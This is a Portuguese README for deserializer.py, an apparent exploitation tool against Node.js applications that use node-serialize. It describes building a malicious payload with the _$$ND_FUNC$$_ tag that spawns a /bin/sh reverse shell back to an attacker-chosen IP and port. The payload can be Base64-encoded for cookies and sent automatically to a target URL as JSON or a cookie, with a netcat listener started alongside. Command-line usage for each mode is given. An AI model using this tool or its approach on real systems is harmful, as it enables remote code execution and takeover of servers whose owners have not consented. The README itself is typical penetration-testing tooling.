# 🧬 deserializer.py

![dese](https://github.com/user-attachments/assets/7c3f398f-3da5-4cef-9e70-62d08141e59f)


Ferramenta de exploração para **Node.js Deserialization (node-serialize)** com suporte à execução automatizada de payloads **Reverse Shell**.

Este script foi feito para **gerar, codificar e opcionalmente enviar automaticamente** um payload malicioso para aplicações Node.js vulneráveis à deserialização. Ele suporta envio via JSON direto no corpo da requisição ou através de cookies.

---

## 🚀 Funcionalidades

- Geração de payload malicioso com shell reversa (`/bin/sh`) usando `node-serialize`.
- Codificação automática em Base64 para uso em cookies.
- Envio automático do payload com listener embutido.
- Suporte ao envio via **JSON** ou **Cookie**.
- Uso simples por linha de comando com parâmetros.

---


## Atenção:

- Ele passa o payload no campo "email" e o campo poderá/deverá ser alterado para o campo que a aplicação receberá!

---

## 📦 Requisitos

- Python 3.6+
- `requests` (`pip install requests`)
- `netcat` (`nc`) instalado no sistema

---

## 🧠 Como funciona

O script gera um payload com a tag `_$$ND_FUNC$$_`, usada em exploits de `node-serialize`, onde uma função JavaScript é deserializada e executada no backend Node.js. Ao ser executado, ele conecta ao seu IP e porta definidos, abrindo uma shell remota.

---

## 🛠️ Uso

### Geração simples do payload

    python3 deserializer.py <LHOST> <LPORT>

### Envio automático já com a reverse shell + tipo de payload para cookie:

    python3 deserializer.py <LHOST> <LPORT> --reverse <URL> --cookie

### Envio automático já com a reverse shell + tipo de payload para json:

    python3 deserializer.py <LHOST> <LPORT> --reverse <URL> --json

